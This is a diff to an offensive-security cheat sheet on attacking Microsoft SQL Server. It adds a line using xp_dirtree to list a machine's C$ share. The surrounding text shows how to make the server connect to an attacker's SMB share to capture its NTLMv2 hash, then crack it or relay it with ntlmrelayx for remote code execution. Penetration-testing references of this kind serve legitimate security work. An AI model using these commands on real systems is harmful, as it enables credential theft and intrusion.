@@ -30,7 +30,7 @@ NOTE: Remember that 'sa' user is more likely to be able to run xp_cmdshell in th
 
 <br>
 
-### NTLM relay / hash grabbing
+### NTLM relay / hash grabbing / file enumeration
 
 You can also try to get ntlmv2 hash for the user which is running the server. Then you can crack offline that hash to get credentials, or (if you suspect that credentials could have admin rights against another domain machine) you can use "ntlmrelayx" tool to relay the credentials and get RCE (or whatever) to second machine.
 
@@ -39,6 +39,8 @@ From your attacking machine: `smbserver.py -smb2support share .` (also "responde
 Inside mssqlclient.py session: `xp_dirtree \\<your_smbserver_ip>\whatever`
 
 For NTLM relay look for "responder" and "ntlmrelayx" functionalitys.
+
+Additionally you can use xp_dirtree to enumerate files inside C volume or any other share: `xp_dirtree \\localhost\C$\`
 
 <br>
 
